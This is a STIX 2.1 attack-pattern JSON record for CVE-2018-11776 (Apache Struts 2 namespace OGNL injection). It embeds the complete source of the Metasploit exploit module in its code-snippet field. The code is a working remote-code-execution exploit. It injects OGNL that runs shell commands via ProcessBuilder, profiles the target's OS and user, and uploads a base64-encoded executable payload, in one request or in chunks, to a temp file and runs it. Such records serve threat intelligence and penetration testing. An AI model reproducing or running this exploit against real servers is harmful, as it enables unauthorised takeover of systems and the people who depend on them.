{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--424e45de-9d1a-4df7-991f-3d7a6de5d07e",
    "created": "2024-08-14T17:09:55.94395Z",
    "modified": "2024-08-14T17:09:55.943954Z",
    "name": "Apache Struts 2 Namespace Redirect OGNL Injection",
    "description": " This module exploits a remote code execution vulnerability in Apache Struts version 2.3 - 2.3.4, and 2.5 - 2.5.16. Remote Code Execution can be performed via an endpoint that makes use of a redirect action.  Note that this exploit is dependant on the version of Tomcat running on the target.  Versions of Tomcat starting with 7.0.88 currently don't support payloads larger than ~7.5kb.  Windows Meterpreter sessions on Tomcat >=7.0.88 are currently not supported.  Native payloads will be converted to executables and dropped in the server's temp dir. If this fails, try a cmd/* payload, which won't have to write to the disk. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/struts2_namespace_ognl.rb",
            "external_id": "struts2_namespace_ognl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-11776"
        },
        {
            "source_name": "reference",
            "url": "https://lgtm.com/blog/apache_struts_CVE-2018-11776"
        },
        {
            "source_name": "reference",
            "url": "https://cwiki.apache.org/confluence/display/WW/S2-057"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/hook-s3c/CVE-2018-11776-Python-PoC"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  # Eschewing CmdStager for now, since the use of '\\' and ';' are killing me\n  #include Msf::Exploit::CmdStager   # https://docs.metasploit.com/docs/development/developing-modules/guides/how-to-use-command-stagers.html\n\n  # NOTE: Debugging code has been stripped, but is available in the commit history: a9e625789175a4c4fdfc7092eedfaf376e4d648e\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Struts 2 Namespace Redirect OGNL Injection',\n      'Description'    => %q{\n        This module exploits a remote code execution vulnerability in Apache Struts\n        version 2.3 - 2.3.4, and 2.5 - 2.5.16. Remote Code Execution can be performed\n        via an endpoint that makes use of a redirect action.\n\n        Note that this exploit is dependant on the version of Tomcat running on\n        the target.  Versions of Tomcat starting with 7.0.88 currently don't\n        support payloads larger than ~7.5kb.  Windows Meterpreter sessions on\n        Tomcat >=7.0.88 are currently not supported.\n\n        Native payloads will be converted to executables and dropped in the\n        server's temp dir. If this fails, try a cmd/* payload, which won't\n        have to write to the disk.\n      },\n      'Author'         => [\n        'Man Yue Mo', # Discovery\n        'hook-s3c',   # PoC\n        'asoto-r7',   # Metasploit module\n        'wvu'         # Metasploit module\n      ],\n      'References'     => [\n        ['CVE', '2018-11776'],\n        ['URL', 'https://lgtm.com/blog/apache_struts_CVE-2018-11776'],\n        ['URL', 'https://cwiki.apache.org/confluence/display/WW/S2-057'],\n        ['URL', 'https://github.com/hook-s3c/CVE-2018-11776-Python-PoC'],\n      ],\n      'Privileged'     => false,\n      'Targets'        => [\n        [\n          'Automatic detection', {\n            'Platform'   => %w{ unix windows linux },\n            'Arch'       => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],\n          },\n        ],\n        [\n          'Windows', {\n            'Platform'   => %w{ windows },\n            'Arch'       => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],\n          },\n        ],\n        [\n          'Linux', {\n            'Platform'       => %w{ unix linux },\n            'Arch'           => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],\n            'DefaultOptions' => {'PAYLOAD' => 'cmd/unix/generic'}\n          },\n        ],\n      ],\n      'DisclosureDate' => '2018-08-22', # Private disclosure = 2018-04-10\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          Opt::RPORT(8080),\n          OptString.new('TARGETURI', [ true, 'A valid base path to a struts application', '/' ]),\n          OptString.new('ACTION', [ true, 'A valid endpoint that is configured as a redirect action', 'showcase.action' ]),\n          OptBool.new('ENABLE_STATIC', [ true, 'Enable \"allowStaticMethodAccess\" before executing OGNL', true ]),\n        ]\n      )\n      register_advanced_options(\n        [\n          OptString.new('HTTPMethod', [ true, 'The HTTP method to send in the request. Cannot contain spaces', 'GET' ]),\n          OptString.new('HEADER', [ true, 'The HTTP header field used to transport the optional payload', \"X-#{rand_text_alpha(4)}\"] ),\n          OptString.new('TEMPFILE', [ true, 'The temporary filename written to disk when executing a payload', \"#{rand_text_alpha(8)}\"] ),\n        ]\n      )\n  end\n\n  def check\n    # METHOD 1: Try to extract the state of hte allowStaticMethodAccess variable\n    ognl = \"#_memberAccess['allowStaticMethodAccess']\"\n\n    resp = send_struts_request(ognl)\n\n    # If vulnerable, the server should return an HTTP 302 (Redirect)\n    #   and the 'Location' header should contain either 'true' or 'false'\n    if resp && resp.headers['Location']\n      output = resp.headers['Location']\n      vprint_status(\"Redirected to:  #{output}\")\n      if (output.include? '/true/')\n        print_status(\"Target does *not* require enabling 'allowStaticMethodAccess'.  Setting ENABLE_STATIC to 'false'\")\n        datastore['ENABLE_STATIC'] = false\n        CheckCode::Vulnerable\n      elsif (output.include? '/false/')\n        print_status(\"Target requires enabling 'allowStaticMethodAccess'.  Setting ENABLE_STATIC to 'true'\")\n        datastore['ENABLE_STATIC'] = true\n        CheckCode::Vulnerable\n      else\n        CheckCode::Safe\n      end\n    elsif resp && resp.code==400\n      # METHOD 2: Generate two random numbers, ask the target to add them together.\n      #   If it does, it's vulnerable.\n      a = rand(10000)\n      b = rand(10000)\n      c = a+b\n\n      ognl = \"#{a}+#{b}\"\n\n      resp = send_struts_request(ognl)\n\n      if resp.headers['Location'].include? c.to_s\n        vprint_status(\"Redirected to:  #{resp.headers['Location']}\")\n        print_status(\"Target does *not* require enabling 'allowStaticMethodAccess'.  Setting ENABLE_STATIC to 'false'\")\n        datastore['ENABLE_STATIC'] = false\n        CheckCode::Vulnerable\n      else\n        CheckCode::Safe\n      end\n    elsif resp.nil?\n      fail_with(Failure::Unreachable,\"Target did not respond.  Please double check RHOSTS and RPORT\")\n    end\n  end\n\n  def exploit\n    case payload.arch.first\n    when ARCH_CMD\n      resp = execute_command(payload.encoded)\n    else\n      resp = send_payload()\n    end\n  end\n\n  def encode_ognl(ognl)\n    # Check and fail if the command contains the follow bad characters:\n    #   ';' seems to terminates the OGNL statement\n    #   '/' causes the target to return an HTTP/400 error\n    #   '\\' causes the target to return an HTTP/400 error (sometimes?)\n    #   '\\r' ends the GET request prematurely\n    #   '\\n' ends the GET request prematurely\n\n    bad_chars = %w[; \\\\ \\r \\n]    # and maybe '/'\n    bad_chars.each do |c|\n      if ognl.include? c\n        print_error(\"Bad OGNL request: #{ognl}\")\n        fail_with(Failure::BadConfig, \"OGNL request cannot contain a '#{c}'\")\n      end\n    end\n\n    # The following list of characters *must* be encoded or ORNL will asplode\n    encodable_chars = { \"%\": \"%25\",       # Always do this one first.  :-)\n                        \" \": \"%20\",\n                        \"\\\"\":\"%22\",\n                        \"#\": \"%23\",\n                        \"'\": \"%27\",\n                        \"<\": \"%3c\",\n                        \">\": \"%3e\",\n                        \"?\": \"%3f\",\n                        \"^\": \"%5e\",\n                        \"`\": \"%60\",\n                        \"{\": \"%7b\",\n                        \"|\": \"%7c\",\n                        \"}\": \"%7d\",\n                       #\"\\/\":\"%2f\",       # Don't do this.  Just leave it front-slashes in as normal.\n                       #\";\": \"%3b\",       # Doesn't work.  Anyone have a cool idea for a workaround?\n                       #\"\\\\\":\"%5c\",       # Doesn't work.  Anyone have a cool idea for a workaround?\n                       #\"\\\\\":\"%5c%5c\",    # Doesn't work.  Anyone have a cool idea for a workaround?\n                      }\n\n    encodable_chars.each do |k,v|\n     #ognl.gsub!(k,v)                     # TypeError wrong argument type Symbol (expected Regexp)\n      ognl.gsub!(\"#{k}\",\"#{v}\")\n    end\n    return ognl\n  end\n\n  def send_struts_request(ognl, payload: nil, headers: nil)\n    ognl = \"${#{ognl}}\"\n    vprint_status(\"Submitted OGNL: #{ognl}\")\n    ognl = encode_ognl(ognl)\n\n    if headers.nil?\n      headers = {'Keep-Alive': 'timeout=5, max=1000'}\n    end\n\n    if payload\n      vprint_status(\"Embedding payload of #{payload.length} bytes\")\n      headers[datastore['HEADER']] = payload\n    end\n\n    # TODO: Consider embedding OGNL in an HTTP header to hide it from the Tomcat logs\n    uri = normalize_uri(target_uri.path, \"/#{ognl}/#{datastore['ACTION']}\")\n\n    r = send_request_cgi(\n     #'encode'  => true,     # this fails to encode '\\', which is a problem for me\n      'uri'     => uri,\n      'method'  => datastore['HTTPMethod'],\n      'headers' => headers\n    )\n\n    if r && r.code == 404\n      fail_with(Failure::UnexpectedReply, \"Server returned HTTP 404, please double check TARGETURI and ACTION options\")\n    end\n\n    return r\n  end\n\n  def send_profile\n    # Use OGNL to extract properties from the Java environment\n\n    properties = { 'os.name': nil,          # e.g. 'Linux'\n                   'os.arch': nil,          # e.g. 'amd64'\n                   'os.version': nil,       # e.g. '4.4.0-112-generic'\n                   'user.name': nil,        # e.g. 'root'\n                   #'user.home': nil,       # e.g. '/root' (didn't work in testing)\n                   'user.language': nil,    # e.g. 'en'\n                   #'java.io.tmpdir': nil,  # e.g. '/usr/local/tomcat/temp' (didn't work in testing)\n                   }\n\n    ognl = \"\"\n    ognl << %q|(#_memberAccess['allowStaticMethodAccess']=true).| if datastore['ENABLE_STATIC']\n    ognl << %Q|('#{rand_text_alpha(2)}')|\n    properties.each do |k,v|\n      ognl << %Q|+(@java.lang.System@getProperty('#{k}'))+':'|\n    end\n    ognl = ognl[0...-4]\n\n    r = send_struts_request(ognl)\n\n    if r.code == 400\n      fail_with(Failure::UnexpectedReply, \"Server returned HTTP 400, consider toggling the ENABLE_STATIC option\")\n    elsif r.headers['Location']\n      # r.headers['Location'] should look like '/bILinux:amd64:4.4.0-112-generic:root:en/help.action'\n      #   Extract the OGNL output from the Location path, and strip the two random chars\n      s = r.headers['Location'].split('/')[1][2..-1]\n\n      if s.nil?\n        # Since the target didn't respond with an HTTP/400, we know the OGNL code executed.\n        #   But we didn't get any output, so we can't profile the target.  Abort.\n        return nil\n      end\n\n      # Confirm that all fields were returned, and non include extra (:) delimiters\n      #   If the OGNL fails, we might get a partial result back, in which case, we'll abort.\n      if s.count(':') > properties.length\n        print_error(\"Failed to profile target.  Response from server: #{r.to_s}\")\n        fail_with(Failure::UnexpectedReply, \"Target responded with unexpected profiling data\")\n      end\n\n      # Separate the colon-delimited properties and store in the 'properties' hash\n      s = s.split(':')\n      i = 0\n      properties.each do |k,v|\n        properties[k] = s[i]\n        i += 1\n      end\n\n      print_good(\"Target profiled successfully: #{properties[:'os.name']} #{properties[:'os.version']}\" +\n        \" #{properties[:'os.arch']}, running as #{properties[:'user.name']}\")\n      return properties\n    else\n      print_error(\"Failed to profile target.  Response from server: #{r.to_s}\")\n      fail_with(Failure::UnexpectedReply, \"Server did not respond properly to profiling attempt.\")\n    end\n  end\n\n  def profile_os\n    # Probe for the target OS and architecture\n    begin\n      properties = send_profile()\n      os = properties[:'os.name'].downcase\n    rescue\n      vprint_warning(\"Target profiling was unable to determine operating system\")\n      os = ''\n      os = 'windows' if datastore['PAYLOAD'].downcase.include? 'win'\n      os = 'linux'   if datastore['PAYLOAD'].downcase.include? 'linux'\n      os = 'unix'    if datastore['PAYLOAD'].downcase.include? 'unix'\n    end\n    return os\n  end\n\n  def execute_command(cmd_input, opts={})\n    # Semicolons appear to be a bad character in OGNL.  cmdstager doesn't understand that.\n    if cmd_input.include? ';'\n      print_warning(\"WARNING: Command contains bad characters: semicolons (;).\")\n    end\n\n    os = profile_os()\n\n    if os && ((os.include? 'linux') || (os.include? 'nix'))\n      cmd = \"{'sh','-c','#{cmd_input}'}\"\n    elsif os && (os.include? 'win')\n      cmd = \"{'cmd.exe','/c','#{cmd_input}'}\"\n    else\n      vprint_error(\"Failed to detect target OS.  Attempting to execute command directly\")\n      cmd = cmd_input\n    end\n\n    # The following OGNL will run arbitrary commands on Windows and Linux\n    #   targets, as well as returning STDOUT and STDERR.  In my testing,\n    #   on Struts2 in Tomcat 7.0.79, commands timed out after 18-19 seconds.\n\n    vprint_status(\"Executing: #{cmd}\")\n\n    ognl =  \"\"\n    ognl << %q|(#_memberAccess['allowStaticMethodAccess']=true).| if datastore['ENABLE_STATIC']\n    ognl << %Q|(#p=new java.lang.ProcessBuilder(#{cmd})).|\n    ognl << %q|(#p.redirectErrorStream(true)).|\n    ognl << %q|(#process=#p.start()).|\n    ognl << %q|(#r=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).|\n    ognl << %q|(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#r)).|\n    ognl << %q|(#r.flush())|\n\n    r = send_struts_request(ognl)\n\n    if r && r.code == 200\n      print_good(\"Command executed:\\n#{r.body}\")\n    elsif r\n      if r.body.length == 0\n        print_status(\"Payload sent, but no output provided from server.\")\n      elsif r.body.length > 0\n        print_error(\"Failed to run command.  Response from server: #{r.to_s}\")\n      end\n    end\n  end\n\n  def send_payload\n    data_header = datastore['HEADER']\n    if data_header.empty?\n      fail_with(Failure::BadConfig, \"HEADER parameter cannot be blank when sending a payload\")\n    end\n\n    payload = generate_payload_exe\n    print_status(\"Generated #{payload.length} byte binary payload\")\n    payload_b64 = [payload].pack(\"m\").delete(\"\\n\")\n\n    if payload_b64.length < 8100\n      send_payload_oneshot(payload_b64)\n    else\n      send_payload_multishot(payload)\n    end\n  end\n\n  def send_payload_oneshot(payload)\n    data_header = datastore['HEADER']\n    if data_header.empty?\n      fail_with(Failure::BadConfig, \"HEADER parameter cannot be blank when sending a payload\")\n    end\n\n    random_filename = datastore['TEMPFILE']\n\n    # d = payload data\n    # f = path to temp file\n    # s = stream/handle to temp file\n    ognl  = \"\"\n    ognl << %q|(#_memberAccess['allowStaticMethodAccess']=true).| if datastore['ENABLE_STATIC']\n    ognl << %Q|(#d=@org.apache.struts2.ServletActionContext@getRequest().getHeader('#{data_header}')).|\n    ognl << %Q|(#f=@java.io.File@createTempFile('#{random_filename}','.tmp')).|\n    ognl << %q|(#f.setExecutable(true)).|\n    ognl << %q|(#f.deleteOnExit()).|\n    ognl << %q|(#s=new java.io.FileOutputStream(#f)).|\n    ognl << %q|(#d=new sun.misc.BASE64Decoder().decodeBuffer(#d)).|\n    ognl << %q|(#s.write(#d)).|\n    #TODO: Consider GZIP: ognl << %q|(#s.write(java.util.zip.GZIPInputStream(#d).read())).|\n    ognl << %q|(#s.close()).|\n    ognl << %q|(#p=new java.lang.ProcessBuilder({#f.getAbsolutePath()})).|\n    ognl << %q|(#p.start()).|\n    ognl << %q|(#f.delete()).|\n\n    success_string = rand_text_alpha(4)\n    ognl << %Q|('#{success_string}')|\n\n    r = send_struts_request(ognl, payload: payload)\n\n    if r && r.headers && r.headers['Location'].split('/')[1] == success_string\n      print_good(\"Payload successfully dropped and executed.\")\n    elsif r && r.headers['Location']\n      vprint_error(\"RESPONSE: \" + r.headers['Location'])\n      fail_with(Failure::PayloadFailed, \"Target did not successfully execute the request\")\n    elsif r && r.code == 400\n      fail_with(Failure::UnexpectedReply, \"Target reported an unspecified error while executing the payload\")\n    end\n  end\n\n  def ognl_create_file()\n    filename = datastore['TEMPFILE']\n\n    # f = path to temp file\n    ognl  = \"\"\n    ognl << %q|(#_memberAccess['allowStaticMethodAccess']=true).| if datastore['ENABLE_STATIC']\n    ognl << %Q|(#f=@java.io.File@createTempFile('#{filename}','.exe')).|\n    ognl << %q|(#f.setExecutable(true)).|\n    ognl << %q|(#f.deleteOnExit()).|\n    ognl << %q|(#f)|\n\n    r = send_struts_request(ognl)\n\n    begin\n      tempfile = r.headers['Location']\n      tempfile = tempfile[1..-(2+datastore['ACTION'].length)]\n      if tempfile.empty?\n        fail_with(Failure::UnexpectedReply,\"Unable to create and locate file on target.  Try a cmd/*/generic payload\")\n      end\n    rescue\n      fail_with(Failure::UnexpectedReply,\"Unable to create and locate file.  Try a cmd/*/generic payload\")\n    end\n\n    return tempfile\n  end\n\n  def send_payload_multishot(payload)\n    tempfile = ognl_create_file()\n    print_status(\"Temp file created: #{tempfile}\")\n\n    payload_cursor = 0\n\n    while payload_cursor < payload.length\n      payload_size  = rand(4500..5000)      #  payload_size cannot exceed 5645 in my testing\n      payload_start = payload_cursor\n      payload_end   = payload_cursor + payload_size\n      payload_end   = payload.size if payload_end > payload.size\n\n      chunk_bin = payload[payload_start..payload_end]\n      chunk_b64 = [chunk_bin].pack(\"m\").delete(\"\\n\")\n      print_status(\"Sending payload chunk: #{chunk_b64.length} bytes\")\n      ognl_append_file(tempfile, chunk_b64)\n\n      payload_cursor = payload_end + 1\n    end\n\n    ognl_execute(tempfile)\n  end\n\n  def ognl_append_file(payload_file, payload_chunk)\n    data_header = datastore['HEADER'] + 'd'\n    file_header = datastore['HEADER'] + 'f'\n    headers = {\n      \"#{data_header}\": payload_chunk,\n      \"#{file_header}\": payload_file,\n      }\n\n    # d = payload data\n    # f = path to temp file\n    # s = stream/handle to temp file\n    ognl  = \"\"\n    ognl << %q|(#_memberAccess['allowStaticMethodAccess']=true).| if datastore['ENABLE_STATIC']\n    ognl << %Q|(#d=@org.apache.struts2.ServletActionContext@getRequest().getHeader('#{data_header}')).|\n    ognl << %Q|(#f=@org.apache.struts2.ServletActionContext@getRequest().getHeader('#{file_header}')).|\n    ognl << %q|(#s=new java.io.FileOutputStream(#f,1)).|\n    ognl << %q|(#d=new sun.misc.BASE64Decoder().decodeBuffer(#d)).|\n    ognl << %q|(#s.write(#d)).|\n    ognl << %q|(#s.close()).|\n\n    success_string = rand_text_alpha(4)\n    ognl << %Q|('#{success_string}')|\n    r = send_struts_request(ognl, headers: headers)\n\n    begin\n      if r.headers['Location'].include? success_string\n        vprint_good(\"OGNL payload chunk sent successfully.\")\n        return\n      else\n        fail_with(Failure::UnexpectedReply, \"OGNL payload upload did not respond\")\n      end\n    rescue\n      fail_with(Failure::UnexpectedReply, \"OGNL payload upload failed\")\n    end\n  end\n\n  def ognl_execute(file)\n    file_header = datastore['HEADER'] + 'f'\n    headers = {\n      \"#{file_header}\": file,\n      }\n\n    # f = path to temp file\n    # p = process handle\n    ognl =  \"\"\n    ognl << %q|(#_memberAccess['allowStaticMethodAccess']=true).| if datastore['ENABLE_STATIC']\n    ognl << %Q|(#f=@org.apache.struts2.ServletActionContext@getRequest().getHeader('#{file_header}')).|\n    ognl << %q|(#p=new java.lang.ProcessBuilder(#f)).|\n    ognl << %q|(#p.start()).|\n    ognl << %q|(#f.delete()).|\n\n    success_string = rand_text_alpha(4)\n    ognl << %Q|('#{success_string}')|\n    r = send_struts_request(ognl, headers: headers)\n\n    begin\n      if r.code==302\n        print_good(\"OGNL payload executed successfully.\")\n      else\n        fail_with(Failure::PayloadFailed, \"Target did not successfully execute the request\")\n      end\n    rescue\n      vprint_status(\"TARGET RESPONDED: #{r.to_s}\")\n      fail_with(Failure::UnexpectedReply, \"Target reported an unspecified error while attempting to execute the payload\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-08-22, # Private disclosure = 2018-04-10",
    "x_mitre_platforms": [
        "%w{ unix linux }"
    ]
}